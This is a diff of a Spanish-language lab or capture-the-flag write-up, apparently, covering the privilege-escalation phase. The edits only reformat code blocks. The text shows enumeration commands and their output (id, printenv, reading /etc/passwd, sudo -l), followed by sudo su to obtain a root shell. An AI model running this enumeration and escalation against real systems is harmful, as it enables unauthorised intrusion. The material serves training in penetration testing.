@@ -233,13 +233,17 @@ Ya estamos dentro.
 ## FASE ESCALADA DE PRIVILEGIOS
 
 Provamos a mirar si estamos en alfún grupo interesante:
-```
+```bash
 id
+```
+```
 uid=1003(admin) gid=1003(admin) groups=1003(admin),100(users)
 ```
 y...no, miramos la variable de entorno
-```
+```bash
 printenv
+```
+```
 SHELL=/bin/bash
 PWD=/home/admin
 LOGNAME=admin
@@ -257,16 +261,20 @@ _=/usr/bin/printenv
 ```
 nada relevante, ojo que me he llegado a ver aquí contraseás en texto claro
 Miramos usuarios :
-```
+```bash
 cat /etc/passwd | grep sh$
+```
+```
 root:x:0:0:root:/root:/bin/bash
 ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
 admin:x:1003:1003:,,,:/home/admin:/bin/bash
 sjd:x:1001:1001:,,,:/home/sjd:/bin/bash
 ```
 ahora toca mirar si tenemos algún privilegio sudo:
-```
+```bash
 sudo -l
+```
+```
 [sudo] password for admin: 
 Matching Defaults entries for admin on 8b209e5d837a:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
@@ -276,7 +284,7 @@ User admin may run the following commands on 8b209e5d837a:
 ```
 .....puedo ejecutar como cualquier usuario....lo que quiera?
 ```
-admin@8b209e5d837a:~$ sudo su
+admin@8b209e5d837a:~$ sudo su 
 root@8b209e5d837a:/home/admin# 
 ```
 
